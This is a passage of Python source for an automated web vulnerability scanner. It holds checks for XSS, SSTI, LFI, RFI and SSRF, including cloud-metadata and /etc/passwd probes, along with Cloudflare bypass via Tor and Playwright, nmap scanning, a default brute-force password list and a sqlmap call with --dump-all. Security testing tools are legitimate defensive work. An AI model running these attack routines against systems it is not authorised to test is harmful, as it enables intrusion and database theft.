                                    data: [%d, %d, %d, %d, %d],
                                    backgroundColor: ['#600', '#7a2d00', '#8c5a00', '#2a522a', '#2c3e50'],
                                    borderWidth: 1
                                }]
                            },
                            options: {
                                indexAxis: 'y',
                                responsive: true,
                                scales: {
                                    x: { beginAtZero: true, ticks: { color: '#e0e0e0' } },
                                    y: { ticks: { color: '#e0e0e0' } }
                                }
                            }
                        });
                        function filterTable() {
                            const severityFilter = document.getElementById('severityFilter').value.toLowerCase();
                            const searchInput = document.getElementById('searchInput').value.toLowerCase();
                            const table = document.getElementById('findingsTable');
                            const tr = table.getElementsByTagName('tr');
                            for (let i = 1; i < tr.length; i++) {
                                const severityTd = tr[i].getElementsByTagName("TD")[0];
                                const messageTd = tr[i].getElementsByTagName("TD")[2];
                                if (severityTd && messageTd) {
                                    const severityMatch = severityFilter === '' || severityTd.textContent.toLowerCase().includes(severityFilter);
                                    const searchMatch = messageTd.textContent.toLowerCase().includes(searchInput);
                                    if (severityMatch && searchMatch) {
                                        tr[i].style.display = '';
                                    } else {
                                        tr[i].style.display = 'none';
                                    }
                                }
                            }
                        }
                        function toggleEvidence(id) {
                            const el = document.getElementById(id);
                            if (el.style.display === 'block') {
                                el.style.display = 'none';
                            } else {
                                el.style.display = 'block';
                            }
                        }
                        function sortTable(n) {
                            const table = document.getElementById("findingsTable");
                            let rows, switching, i, x, y, shouldSwitch, dir, switchcount = 0;
                            switching = true;
                            dir = "asc";
                            while (switching) {
                                switching = false;
                                rows = table.rows;
                                for (i = 1; i < (rows.length - 1); i++) {
                                    shouldSwitch = false;
                                    x = rows[i].getElementsByTagName("TD")[n];
                                    y = rows[i + 1].getElementsByTagName("TD")[n];
                                    let xContent = isNaN(parseFloat(x.innerHTML)) ? x.innerHTML.toLowerCase() : parseFloat(x.innerHTML);
                                    let yContent = isNaN(parseFloat(y.innerHTML)) ? y.innerHTML.toLowerCase() : parseFloat(y.innerHTML);
                                    if (dir == "asc") {
                                        if (xContent > yContent) {
                                            shouldSwitch = true;
                                            break;
                                        }
                                    } else if (dir == "desc") {
                                        if (xContent < yContent) {
                                            shouldSwitch = true;
                                            break;
                                        }
                                    }
                                }
                                if (shouldSwitch) {
                                    rows[i].parentNode.insertBefore(rows[i + 1], rows[i]);
                                    switching = true;
                                    switchcount++;
                                } else {
                                    if (switchcount == 0 && dir == "asc") {
                                        dir = "desc";
                                        switching = true;
                                    }
                                }
                            }
                        }
                    </script>
                </body>
                </html>
            ''' % (
                severity_counts.get('critical', 0),
                severity_counts.get('high', 0),
                severity_counts.get('medium', 0),
                severity_counts.get('low', 0),
                severity_counts.get('info', 0)
            )
            with open(html_path, "w") as f:
                f.write(html)
            self.log("info", f"Reports saved in directory: {run_report_dir}")

    def _safe_request(
            self,
            method,
            url,
            params=None,
            data=None,
            headers=None,
            files=None,
            allow_redirects=True,
            timeout=None,
            max_retries=3):
        self._throttle()
        safe_url = self._ensure_scheme(url)
        if not safe_url:
            self.log("error", "Invalid URL provided.")
            return None

        request_headers = {
            "User-Agent": random.choice(
                self.config.get(
                    "SETTINGS",
                    {})
                .get(
                    "USER_AGENTS",
                    ["Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"]))
        }
        if headers:
            request_headers.update(headers)
        if self.cookie:
            request_headers["Cookie"] = self.cookie
        proxies = {
            "http": self.proxy,
            "https": self.proxy} if self.proxy else {}

        for attempt in range(max_retries):
            try:
                response = self.session.request(
                    method,
                    safe_url,
                    params=params,
                    data=data,
                    headers=request_headers,
                    timeout=timeout or self.cf_timeout,
                    files=files,
                    allow_redirects=allow_redirects,
                    proxies=proxies)
                return response
            except requests.exceptions.Timeout as e:
                self.log(
                    "warn",
                    f"Request to {safe_url} timed out (attempt {
                        attempt + 1}/{max_retries}): {
                        str(e).encode(
                            'ascii',
                            errors='replace').decode('ascii')}")
                if attempt < max_retries - 1:
                    time.sleep(1)
                else:
                    self.log(
                        "error",
                        f"Request to {safe_url} timed out after {max_retries} attempts.")
                    return None
            except requests.exceptions.ConnectionError as e:
                self.log(
                    "warn",
                    f"Connection failed to {safe_url} (attempt {
                        attempt + 1}/{max_retries}): {
                        str(e).encode(
                            'ascii',
                            errors='replace').decode('ascii')}")
                if attempt < max_retries - 1:
                    time.sleep(2 ** attempt)
                else:
                    self.log(
                        "error",
                        f"Failed to connect to {safe_url} after {max_retries} attempts.")
                    return None
            except requests.RequestException as e:
                self.log(
                    "warn",
                    f"Request to {safe_url} failed (attempt {
                        attempt + 1}/{max_retries}): {
                        str(e).encode(
                            'ascii',
                            errors='replace').decode('ascii')}")
                return None
        return None

    def get_payloads(self, payload_type):
        payloads = self.payloads.get(payload_type)
        if not payloads:
            self.log(
                "warn",
                f"No payloads found for {payload_type}. The check might be ineffective.")
            return []
        count = len(payloads) if isinstance(
            payloads, list) else len(
            payloads.keys())
        self.log("info", f"Using {count} payloads for {payload_type}")
        return payloads

    def bypass_cloudflare(self, use_tor, aggressive, timeout):
        self.log_step("Attempting CloudFlare bypass...")
        if use_tor:
            self.proxy = "socks5://127.0.0.1:9050"
            self.log("info", "Using Tor proxy for CloudFlare bypass")
        if CLOUDSCRAPER_AVAILABLE:
            self.log("info", "Attempting bypass with cloudscraper...")
            try:
                scraper = cloudscraper.create_scraper()
                response = scraper.get(self.target, timeout=timeout)
                if response.status_code < 400:
                    self.log(
                        "success",
                        "Cloudflare bypass successful with cloudscraper. Updating session.")
                    self.session.cookies.update(scraper.cookies)
                    self.session.headers.update(scraper.headers)
                    return True
            except Exception as e:
                self.log(
                    "warn",
                    f"cloudscraper failed: {e}. Falling back to other methods.")
        if aggressive and PLAYWRIGHT_AVAILABLE:

            self.log(
                "info",
                "Attempting bypass with Playwright (aggressive mode)...")
            try:
                with sync_playwright() as p:
                    browser = p.chromium.launch(
                        headless=True, proxy={"server": self.proxy} if self.proxy else None)
                    context = browser.new_context(user_agent=random.choice(
                        self.config.get("SETTINGS", {}).get("USER_AGENTS")))
                    page = context.new_page()
                    page.goto(
                        self.target,
                        timeout=timeout * 1000,
                        wait_until="networkidle")
                    cookies = {c['name']: c['value']
                               for c in context.cookies()}
                    self.session.cookies.update(cookies)
                    self.log(
                        "success",
                        "Cloudflare bypass successful with Playwright. Session updated.")
                    browser.close()
                    return True
            except Exception as e:
                self.log("error", f"Playwright is disabled, cannot perform aggressive bypass. Error: {e}")
        self.log("error", "All Cloudflare bypass methods failed.")
        return False

    def find_databases(self, check_ports, deep_scan, timeout, full_scan=False):
        self.log_step("Scanning for databases and open ports...")
        common_paths = self.config.get(
            "SETTINGS", {}).get(
            "COMMON_PATHS", [
                "/backup.sql", "/db.bak"])
        if check_ports:
            if not shutil.which("nmap"):
                self.log("warn", "nmap not found, skipping port scan.")
            else:
                scan_type = "Full Port Scan" if full_scan else "Fast Scan"
                self.log(
                    "run", f"Running nmap for service discovery ({scan_type})...")
                nmap_flags = "-p- -T4" if full_scan else "-F"
                command = f"nmap {nmap_flags} -sV {self.host}"
                try:
                    result = subprocess.run(
                        command,
                        shell=True,
                        capture_output=True,
                        text=True,
                        timeout=180)
                    open_ports_found = False
                    for line in result.stdout.split('\n'):
                        if "/tcp" in line and "open" in line:
                            open_ports_found = True
                            parts = re.split(r'\s+', line)
                            port_info = f"Port: {parts[0]}, State: {parts[1]}, Service: {' '.join(parts[2:])}"
                            self.log(
                                "warn",
                                f"Nmap found open port: {port_info}",
                                severity="medium")
                            self._add_finding("medium", f"Open port detected by nmap on {self.host}", {"details": port_info}, self.host, module="Port Scan")
                    if not open_ports_found:
                        self.log(
                            "info", "Nmap scan completed, no open ports in top 100.")
                except subprocess.TimeoutExpired:
                    self.log("error", "nmap scan timed out.")
                except Exception as e:
                    self.log("error", f"nmap scan failed: {e}")
        else:
            self.log("info", "Port scanning disabled via --no-ports")
        if deep_scan:
            self.log("info", "Performing deep scan for database backup files")
            backup_extensions = ['.sql', '.bak', '.sql.gz',
                                 '.sql.bak']
            for path in tqdm(
                    common_paths,
                    desc="Checking backup files",
                    file=sys.stdout):
                if any(path.endswith(ext) for ext in backup_extensions):
                    test_url = urljoin(self.base_url, path)
                    response = self._safe_request("GET", test_url)
                    if response and response.status_code == 200:
                        self.log(
                            "warn",
                            f"Database backup file exposed: {test_url}",
                            severity="critical")
                        self._add_finding("critical", f"Database backup file exposed: {test_url}", {"details": "Backup file accessible"}, test_url, module="Information Disclosure")
        self.log(
            "info",
            f"Database scan completed. Found {len([f for f in self.findings if 'database' in f.get('message', '').lower()])} database-related findings")

    def check_oauth_misconfig(self):
        self.log_step("Checking for OAuth misconfiguration...")
        oauth_payloads = self.get_payloads("OAUTH_MISCONFIG")
        findings_count = len(self.findings)
        if not oauth_payloads:
            self.log("warn", "No OAuth payloads found, using default")
            oauth_payloads = self.get_payloads("OAUTH_MISCONFIG")
        oauth_endpoints = ["/oauth", "/auth", "/login/oauth"]
        for url in tqdm(self.visited_urls,
                        desc="Checking OAuth endpoints", file=sys.stdout):
            parsed = urlparse(url)
            params = parse_qs(parsed.query)
            for endpoint in oauth_endpoints:
                test_url = urljoin(self.target, endpoint)
                for payload in oauth_payloads:
                    test_params = params.copy()
                    param = payload.split("=")[0]
                    test_params[param] = payload.split("=")[1]
                    test_url = urlunparse(
                        parsed._replace(
                            query=urlencode(
                                test_params, True)))
                    response = self._safe_request("GET", test_url)
                    if response and response.status_code in [
                            200, 302] and "access_token" in response.text.lower():
                        self._add_finding("high", f"Potential OAuth misconfiguration at {test_url}", {"payload": payload}, test_url, module="OAuth Misconfiguration", payload=payload)
        self.log(
            "info",
            f"OAuth check completed. Found {
                len(
                    self.findings) -
                findings_count} new findings")

    def check_session_fixation(self):
        self.log_step("Checking for session fixation...")
        findings_count = len(self.findings)
        for url in tqdm(self.visited_urls,
                        desc="Checking session fixation", file=sys.stdout):
            response = self._safe_request("GET", url)
            if response and "Set-Cookie" in response.headers:

                cookies = response.headers["Set-Cookie"].lower()
                if "secure" not in cookies or "httponly" not in cookies or "samesite" not in cookies:
                    self._add_finding("medium", f"Potential session fixation vulnerability at {url} (missing Secure/HttpOnly/SameSite attributes)", {"cookies": cookies}, url, module="Session Management")
        self.log(
            "info",
            f"Session fixation check completed. Found {
                len(
                    self.findings) -
                findings_count} new findings")

    def check_api_token_leak(self):
        self.log_step("Checking for hardcoded API token leaks...")
        key_regex = re.compile(r"""
            (?i)(api_key|secret|token|auth|password|key|client_id|client_secret|bearer|access_token|private_key)
            \s*[:=]\s*
            ['"]?([a-z0-9\-_=]{24,})['"]?
        """, re.VERBOSE)
        findings_count = len(self.findings)
        for url in tqdm(
                self.visited_urls,
                desc="Checking API token leaks",
                file=sys.stdout):
            response = self._safe_request("GET", url)
            if response and (
                "javascript" in response.headers.get(
                    "Content-Type",
                    "") or "json" in response.headers.get(
                    "Content-Type",
                    "")):
                matches = key_regex.finditer(response.text)
                for match in matches:
                    key_value = match.group(2)
                    if len(set(key_value)) < 5:
                        continue
                    self._add_finding("high", f"Potential API token leak found at {url}", {"matched_text": match.group(0), "key_name": match.group(1), "key_value": key_value}, url, module="API Key Leakage", payload=match.group(0))
        self.log(
            "info",
            f"API token leak check completed. Found {
                len(
                    self.findings) -
                findings_count} new findings")

    def check_security_headers(self):
        self.log_step("Checking for missing security headers...")
        response = self._safe_request("GET", self.target)
        if not response:
            self.log(
                "warn",
                "Could not fetch target for security header check.")
            return
        headers = {k.lower(): v for k, v in response.headers.items()}
        headers_to_check = {
            'content-security-policy': 'high',
            'strict-transport-security': 'medium',
            'x-frame-options': 'medium',
            'x-content-type-options': 'low',
            'referrer-policy': 'low',
            'permissions-policy': 'low',
            'cross-origin-opener-policy': 'medium',
            'cross-origin-embedder-policy': 'medium'
        }
        for header, severity in headers_to_check.items(
        ):
            if header not in headers:
                self._add_finding(severity, f"Security header '{header.title()}' is missing.", {"recommendation": f"Implement the {header.title()} header to enhance security."}, self.target, module="Security Headers")
        if 'content-security-policy' in headers:
            csp = headers['content-security-policy']
            if "'unsafe-inline'" in csp or "'unsafe-eval'" in csp:
                self._add_finding("medium", "Content-Security-Policy (CSP) contains 'unsafe-inline' or 'unsafe-eval'.", {"policy": csp}, self.target, module="Security Headers")
        self.log("info", "Security headers check completed.")

    def _test_all_params(self, check_name, payloads,
                         check_function, pbar_desc):
        """
        Generic helper to test payloads against all parameters in visited URLs.

        :param check_name: Name of the check (e.g., 'XSS').
        :param payloads: List of payloads to test.
        :param check_function: The function to call for each test. It should accept (url, param, payload).
        :param pbar_desc: Description for the progress bar.
        """
        self.log_step(f"Checking for {check_name} vulnerabilities...")
        findings_count = len(self.findings)

        tasks = []
        common_params = self._get_common_params_from_dorks()

        for url in self.visited_urls:
            parsed = urlparse(url)
            if not parsed.scheme or not parsed.netloc:
                continue

            # Skip static assets
            if any(url.lower().endswith(ext) for ext in ['.css', '.js', '.png', '.jpg', '.jpeg', '.gif', '.svg', '.woff', '.woff2', '.ico']):
                continue

            params = parse_qs(parsed.query)

            # If no params, try adding common ones
            if not params and common_params:
                for common_param in common_params:
                    # Create a new URL with the common parameter
                    new_url_with_param = urlunparse(parsed._replace(query=f"{common_param}=1"))
                    for payload in payloads:
                        tasks.append((new_url_with_param, common_param, payload))

            # Test existing parameters
            for param in list(params.keys()):
                for payload in payloads:
                    tasks.append((url, param, payload))

        if not tasks:
            self.log("info", f"No parameters found to test for {check_name}.")
            return

        with ThreadPoolExecutor(max_workers=20) as executor:
            if self.stop_event.is_set():
                self.log(
                    "warn", f"{check_name} check cancelled before starting.")
                return

            futures = {executor.submit(check_function, *task)
                       for task in tasks}
            with tqdm(total=len(futures), desc=pbar_desc, ascii=True) as pbar:
                for future in as_completed(futures):
                    if self.stop_event.is_set():

                        for f in futures:
                            if not f.done():
                                f.cancel()
                        self.log(
                            "warn", f"{check_name} check was cancelled during execution.")

                        executor.shutdown(wait=False, cancel_futures=True)
                        break
                    pbar.update(1)

        self.log(
            "info",
            f"{check_name} check completed. Found {
                len(
                    self.findings) -
                findings_count} new findings.")

    def check_ssrf_oast(self):
        self.log_step("Checking for SSRF using OAST...")
        findings_count = len(self.findings)
        oast_domain = self.get_payloads("OAST").get(
            "INTERACTSH_DOMAIN", "oast.me").split(',')[0]
        if not oast_domain:
            self.log("warn", "No OAST domain configured, using default")
            oast_domain = "oast.me"
        for url in tqdm(self.visited_urls,
                        desc="Testing OAST payloads", file=sys.stdout):
            parsed = urlparse(url)
            params = parse_qs(parsed.query)
            for param in params:
                unique_subdomain = f"ssrf-{
                    ''.join(
                        random.choices(
                            'abcdef0123456789',
                            k=10))}"
                oast_payload = f"http://{unique_subdomain}.{oast_domain}"
                test_params = params.copy()
                test_params[param] = oast_payload
                test_url = urlunparse(
                    parsed._replace(
                        query=urlencode(
                            test_params, True)))
                self._safe_request("GET", test_url, timeout=5)
                self.tested_payload_urls.add(test_url)

                self.log(
                    "info",
                    f"Sent SSRF OAST payload to {test_url}. Check Interactsh for interactions with {unique_subdomain}.{oast_domain}")
        self.log(
            "info",
            f"OAST check completed. Found {
                len(
                    self.findings) -
                findings_count} new findings. Check {oast_domain} for interactions")

    def _check_xss_vulnerability(self, url, param, payload_template):
        unique_marker = ''.join(
            random.choices(
                'abcdefghijklmnopqrstuvwxyz',
                k=10))

        if "alert(" in payload_template:
            payload = re.sub(
                r"alert\((.*?)\)",
                lambda m: f"alert('{unique_marker}')",
                payload_template)
        else:
            payload = payload_template + unique_marker

        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        test_params = params.copy()
        test_params[param] = payload
        test_url = urlunparse(
            parsed._replace(
                query=urlencode(
                    test_params,
                    True)))

        response = self._safe_request("GET", test_url)
        if response and unique_marker in response.text:
            if re.search(
                fr"(<script>.*{re.escape(unique_marker)}.*</script>|on\w+\s*=\s*['\"]?.*{re.escape(unique_marker)}.*['\"]?)",
                    response.text, re.IGNORECASE | re.DOTALL):
                self._add_finding("high", "Potential Reflected XSS", {"param": param, "proof": "Payload reflected and executed in response."}, test_url, module="XSS", payload=payload)

    def check_xss(self):
        xss_payloads = self.get_payloads("XSS")
        self._test_all_params("XSS", xss_payloads, self._check_xss_vulnerability, "Testing XSS")

    def _run_sqlmap_exploit(self, url):
        if not shutil.which("sqlmap"):
            return

        cmd = ["sqlmap", "-u", url, "--batch", "--dump-all", "--timeout=10", "--retries=1"]
        try:
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=120)
            if "dumped" in result.stdout:
                self.log("success", f"SQLMap dump: {url}")
        except BaseException:
            self.log("warn", f"SQLMap skip (timeout): {url}")

    def ensure_bruteforce_wordlist(self):
        """Buat wordlist di folder payloads/ jika belum ada"""
        wordlist_path = self.bruteforce_wordlist

        if not os.path.exists(wordlist_path):
            os.makedirs(os.path.dirname(wordlist_path), exist_ok=True)
            default_passwords = [
                "admin", "password", "123456", "admin123", "root", "toor",
                "qwerty", "letmein", "welcome", "password123", "admin@123"
            ]
            with open(wordlist_path, 'w') as f:
                for pwd in default_passwords:
                    f.write(pwd + '\n')
            self.log("info", f"Wordlist dibuat otomatis: {wordlist_path}")
        else:
            self.log("success", f"Wordlist ditemukan: {wordlist_path}")

    def check_ssti(self):
        self.log_step("Checking for SSTI vulnerabilities...")
        self.log("info", f"URLs to scan for SSTI: {list(self.visited_urls)}")
        ssti_payloads = self.get_payloads("SSTI")
        findings_count = len(self.findings)
        for url in tqdm(self.visited_urls, desc="Testing SSTI", disable=self.silent,
                        file=sys.stdout, ascii=True):
            parsed = urlparse(url)
            if not parsed.scheme or not parsed.netloc:
                self.log("warn", f"Skipping invalid URL: {url}")
                continue
            params = parse_qs(parsed.query)
            for param in params:
                for payload in ssti_payloads:
                    prefix = ''.join(
                        random.choices(
                            'abcdefghijklmnopqrstuvwxyz', k=4))
                    suffix = ''.join(
                        random.choices(
                            'abcdefghijklmnopqrstuvwxyz', k=4))
                    dynamic_payload_jinja = payload.replace(
                        "7*7", f"'{prefix}'~'{suffix}'")
                    dynamic_payload_freemarker = payload.replace(
                        "7*7", f"'{prefix}'+'{suffix}'")
                    expected_reflection = prefix + suffix
                    for dyn_payload in [dynamic_payload_jinja,
                                        dynamic_payload_freemarker]:
                        test_params = params.copy()
                        test_params[param] = dyn_payload
                        test_url = urlunparse(
                            parsed._replace(
                                query=urlencode(
                                    test_params, True)))
                        response = self._safe_request("GET", test_url)
                        self.tested_payload_urls.add(test_url)
                        if response and expected_reflection in response.text:
                            self._add_finding("high", "Potential SSTI vulnerability", {"param": param, "proof": f"Reflection '{expected_reflection}' found in response."}, test_url, module="SSTI", payload=dyn_payload)
        self.log(
            "info",
            f"SSTI check completed. Found {
                len(
                    self.findings) -
                findings_count} new findings")

    def check_lfi(self):
        self.log_step("Checking for LFI vulnerabilities...")
        self.log("info", f"URLs to scan for LFI: {list(self.visited_urls)}")
        lfi_payloads = self.get_payloads("LFI")
        lfi_signatures = {
            "root:",
            "etc/passwd",
            "[boot loader]",
            "for 16-bit app support"}
        findings_count = len(self.findings)
        for url in tqdm(self.visited_urls, desc="Testing LFI",
                        file=sys.stdout, ascii=True):
            parsed = urlparse(url)
            if not parsed.scheme or not parsed.netloc:
                self.log("warn", f"Skipping invalid URL: {url}")
                continue
            params = parse_qs(parsed.query)
            baseline_response = self._safe_request("GET", url)
            baseline_len = len(
                baseline_response.text) if baseline_response else -1
            for param in params:
                for payload in lfi_payloads:
                    test_params = params.copy()
                    test_params[param] = payload
                    test_url = urlunparse(
                        parsed._replace(
                            query=urlencode(
                                test_params, True)))
                    response = self._safe_request("GET", test_url)
                    self.tested_payload_urls.add(test_url)
                    if not response:
                        continue
                    is_vulnerable = False
                    response_text = response.text
                    if "php://filter" in payload and "base64-encode" in payload:
                        try:
                            decoded_text = base64.b64decode(
                                response_text).decode('utf-8', errors='ignore')
                            if "<?php" in decoded_text or "<?=" in decoded_text:
                                is_vulnerable = True
                        except (base64.binascii.Error, UnicodeDecodeError):
                            pass
                    if not is_vulnerable and any(
                            sig in response_text for sig in lfi_signatures):
                        is_vulnerable = True
                    if not is_vulnerable and baseline_len > 0 and len(
                            response_text) != baseline_len:
                        is_vulnerable = True
                    if is_vulnerable:
                        self._add_finding("critical", f"Potential LFI vulnerability at {test_url}", {"payload": payload, "param": param}, test_url, module="LFI", payload=payload)
        self.log(
            "info", f"LFI check completed. Found {len(self.findings) - findings_count} new findings")

    def check_rfi(self):
        self.log_step("Checking for RFI vulnerabilities...")
        self.log("info", f"URLs to scan for RFI: {list(self.visited_urls)}")
        oast_domain = self.get_payloads("OAST").get(
            "INTERACTSH_DOMAIN", "oast.me").split(',')[0]
        findings_count = len(self.findings)
        for url in tqdm(self.visited_urls, desc="Testing RFI",
                        file=sys.stdout, ascii=True):
            parsed = urlparse(url)
            if not parsed.scheme or not parsed.netloc:
                self.log("warn", f"Skipping invalid URL: {url}")
                continue
            params = parse_qs(parsed.query)
            for param in params:
                unique_subdomain = f"{
                    ''.join(
                        random.choices(
                            'abcdefghijklmnopqrstuvwxyz0123456789',
                            k=12))}"
                oast_payload = f"http://{unique_subdomain}.{oast_domain}"
                test_params = params.copy()
                test_params[param] = oast_payload
                test_url = urlunparse(
                    parsed._replace(
                        query=urlencode(
                            test_params, True)))
                self._safe_request("GET", test_url, timeout=5)

                self.log(
                    "info",
                    f"Sent RFI OAST payload to {test_url}. Check your Interactsh client for interactions with {unique_subdomain}.{oast_domain}")
        self.log(
            "info", f"RFI check completed. Found {len(self.findings) - findings_count} new findings")

    def check_ssrf(self):
        self.log_step("Checking for SSRF vulnerabilities...")
        self.log("info", f"URLs to scan for SSRF: {list(self.visited_urls)}")
        ssrf_payloads = self.get_payloads("SSRF")
        findings_count = len(self.findings)
        if not ssrf_payloads:
            self.log("warn", "No SSRF payloads found, using default")
            ssrf_payloads = self.get_payloads("SSRF")
        payload_signatures = {
            "file:///etc/passwd": ["root:x:0:0"],
            "http://127.0.0.1": ["localhost", "127.0.0.1"],
            "http://2130706433": ["localhost", "127.0.0.1"],
            "http://0177.0.0.1": ["localhost", "127.0.0.1"],
            "http://0x7f.0.0.1": ["localhost", "127.0.0.1"],
            "http://127.1": ["localhost", "127.0.0.1"],
            "http://[::]": ["localhost", "127.0.0.1"],
            "169.254.169.254": ["instance-id", "ami-id", "instance-type"],
            "metadata.google.internal": ["computeMetadata", "instance/"],
        }
        for url in tqdm(self.visited_urls, desc="Testing SSRF", disable=self.silent,
                        file=sys.stdout, ascii=True):
            parsed = urlparse(url)
            if not parsed.scheme or not parsed.netloc:
                self.log("warn", f"Skipping invalid URL: {url}")
                continue
            params = parse_qs(parsed.query)
            baseline_response = self._safe_request("GET", url)

            baseline_text = baseline_response.text if baseline_response else ""
            for param in params:
                for payload in ssrf_payloads:
                    test_params = params.copy()
                    test_params[param] = payload
                    test_url = urlunparse(
                        parsed._replace(
                            query=urlencode(
                                test_params, True)))
                    response = self._safe_request("GET", test_url)
                    self.tested_payload_urls.add(test_url)
                    if not response:
                        continue
                    is_vulnerable = False
                    for key, signatures in payload_signatures.items():
                        if key in payload and any(
                                sig in response.text for sig in signatures):
                            is_vulnerable = True
                            break
                    if not is_vulnerable and (
                            "127.0.0.1" in payload or "localhost" in payload):
                        if response.text != baseline_text and len(
                                response.text) > 0:
                            is_vulnerable = True

                    if is_vulnerable:
                        self._add_finding("high", f"Potential SSRF vulnerability at {test_url}",
                                          {"payload": payload, "param": param}, test_url, module="SSRF", payload=payload)
        self.log(
            "info",
            f"SSRF check completed. Found {
                len(
                    self.findings) -
                findings_count} new findings")

    def check_internal_access_via_ssrf(self):
        self.log_step("Checking for internal access via SSRF...")
        ssrf_internal = self.get_payloads("SSRF_INTERNAL")
        hosts = ssrf_internal.get("HOSTS", [])
        paths = ssrf_internal.get("PATHS", [])
        findings_count = len(self.findings)
        common_ssrf_params = self.get_payloads(
            "OPEN_REDIRECT").get("params", [])

        self.log("info", f"URLs to scan for SSRF: {list(self.visited_urls)}")
        urls_to_scan = [self._ensure_scheme(url) for url in self.visited_urls]

        tasks = []
        for url_to_test in urls_to_scan:
            parsed = urlparse(url_to_test)
            if not parsed.scheme or not parsed.netloc:
                self.log(
                    "warn",
                    f"Skipping invalid URL for SSRF check: {url_to_test}")
                continue

            params = parse_qs(parsed.query)

            params_to_test = set(params.keys()) | set(common_ssrf_params)
            for param in list(params_to_test):
                for host in hosts:
                    for path in paths:
                        payload = f"http://{host}{path}"
                        test_params = params.copy()
                        test_params[param] = [payload]
                        path_component = parsed.path if parsed.path else '/'
                        test_url = urlunparse(
                            (parsed.scheme,
                             parsed.netloc,
                             path_component,
                             parsed.params,
                             urlencode(
                                 test_params,
                                 doseq=True),
                                parsed.fragment))
                        tasks.append((self._ensure_scheme(test_url), payload))
                        self.tested_payload_urls.add(self._ensure_scheme(test_url))

        def check_task(task):
            test_url, payload = task
            response = self._safe_request("GET", test_url, timeout=3)
            if response and response.status_code == 200:
                self._add_finding("high", "Potential internal resource access via SSRF", {"proof": "Successfully accessed a known internal-like path."}, test_url, module="SSRF", payload=payload)

        if not tasks:
            self.log("info", "No tasks generated for internal SSRF check.")
            return

        self.log(
            "run", f"Generated {
                len(tasks)} tasks for internal SSRF check. Starting parallel execution...")
        with ThreadPoolExecutor(max_workers=20) as executor:
            list(
                tqdm(
                    executor.map(
                        check_task,
                        tasks),
                    total=len(tasks),
                    desc="Testing internal SSRF",
                    ascii=True))

        self.log(
            "info",
            f"Internal SSRF check completed. Found {
                len(
                    self.findings) -
                findings_count} new findings")

    def check_open_redirect(self):
        self.log_step("Checking for Open Redirect vulnerabilities...")
        self.log(
            "info",
            f"URLs to scan for Open Redirect: {
                list(
                    self.visited_urls)}")
        open_redirect = self.get_payloads("OPEN_REDIRECT")
        findings_count = len(self.findings)

        params = open_redirect.get("params", [])
        payloads = open_redirect.get("payloads", [])
        urls_to_scan = [self._ensure_scheme(url) for url in self.visited_urls]

        tasks = []
        for url_to_test in urls_to_scan:
            parsed = urlparse(url_to_test)
            if not parsed.scheme or not parsed.netloc:
                self.log("warn", f"Skipping invalid URL: {url_to_test}")
                continue
            query_params = parse_qs(parsed.query)
            params_to_test = set(query_params.keys()) | set(
                params)
            for param in list(params_to_test):
                for payload in payloads:
                    test_params = query_params.copy()
                    test_params[param] = [payload]
                    path_component = parsed.path if parsed.path else '/'
                    test_url = urlunparse(
                        (parsed.scheme,
                         parsed.netloc,
                         path_component,
                         parsed.params,
                         urlencode(
                             test_params,
                             doseq=True),
                            parsed.fragment))
                    tasks.append((self._ensure_scheme(test_url), payload))
                    self.tested_payload_urls.add(self._ensure_scheme(test_url))

        def check_task(task):
            test_url, payload = task
            response = self._safe_request("GET",
                                          test_url, allow_redirects=False, timeout=5)
            if not response:
                return
            location_header = response.headers.get("Location", "")
            if response.is_redirect and "example.com" in location_header:
                self._add_finding("medium", "Potential Open Redirect", {"proof": f"Redirected to Location: {location_header}"}, test_url, module="Open Redirect", payload=payload)

        if not tasks:
            self.log("info", "No tasks generated for Open Redirect check.")
            return

        self.log(
            "run", f"Generated {
                len(tasks)} tasks for Open Redirect check. Starting parallel execution...")
        with ThreadPoolExecutor(max_workers=20) as executor:
            list(
                tqdm(
                    executor.map(
                        check_task,
                        tasks),
                    total=len(tasks),
                    desc="Testing Open Redirect",
                    ascii=True))

        self.log(
            "info",
            f"Open Redirect check completed. Found {
                len(
                    self.findings) -
                findings_count} new findings")

    def check_csrf(self):
        try:
            from bs4 import BeautifulSoup
            BS4_AVAILABLE = True
        except ImportError:
            BS4_AVAILABLE = False
            self.log(
                "warn",
                "BeautifulSoup4 not installed (`pip install beautifulsoup4`). Skipping advanced CSRF check.")
            return
        self.log(
            "info",
            f"URLs to scan for CSRF: {
                list(
                    self.visited_urls)}")
        findings_count = len(self.findings)
        urls_to_scan = [self._ensure_scheme(url) for url in self.visited_urls]
        for url in tqdm(
                urls_to_scan,
                desc="Checking forms for CSRF tokens",
                file=sys.stdout,
                ascii=True):
            parsed = urlparse(url)
            if not parsed.scheme or not parsed.netloc:
                self.log("warn", f"Skipping invalid URL: {url}")
                continue
            response = self._safe_request("GET", url)
            if response and 'text/html' in response.headers.get(
                    'Content-Type', ''):
                soup = BeautifulSoup(response.text, 'html.parser')
                forms = soup.find_all('form')
                for form in [f for f in forms if f.get(
                        'method', '').lower() == 'post']:
                    token_input = None
                    for hidden_input in form.find_all(
                            'input', {'type': 'hidden'}):
                        name = hidden_input.get('name', '').lower()
                        if any(
                            keyword in name for keyword in [
                                'csrf',
                                'token',
                                'nonce']):
                            token_input = hidden_input
                            break
                    if not token_input:
                        self.log(
                            "warn",
                            f"Form without CSRF token found at {url}",
                            severity="medium")
                        self._add_finding("medium", f"Form without CSRF token found at {url}", {"form_action": form.get('action', 'N/A')}, url, module="CSRF")
                    else:
                        form_data = {
                            inp.get('name'): inp.get(
                                'value',
                                'test') for inp in form.find_all('input') if inp.get('name')}
                        tampered_data = form_data.copy()
                        tampered_data[token_input.get(
                            'name')] = "tampered_token_value"
                        action_url = urljoin(url, form.get(
                            'action', ''))
                        action_url = self._ensure_scheme(action_url)
                        tampered_response = self._safe_request("POST",
                                                               action_url, data=tampered_data)
                        if tampered_response and tampered_response.status_code < 400:
                            self.log(
                                "warn",
                                f"CSRF token may not be validated at {action_url}",
                                severity="high")
                            self._add_finding("high", f"CSRF token may not be validated at {action_url}", {"form_action": action_url, "token_name": token_input.get('name')}, action_url, module="CSRF")
        self.log(
            "info",
            f"CSRF check completed. Found {
                len(
                    self.findings) -
                findings_count} new findings")

    def check_idor(self):
        self.log_step("Checking for IDOR vulnerabilities...")
        self.log("info", f"URLs to scan for IDOR: {list(self.visited_urls)}")
        idor_payloads = self.get_payloads("IDOR")
        findings_count = len(self.findings)
        if not idor_payloads:
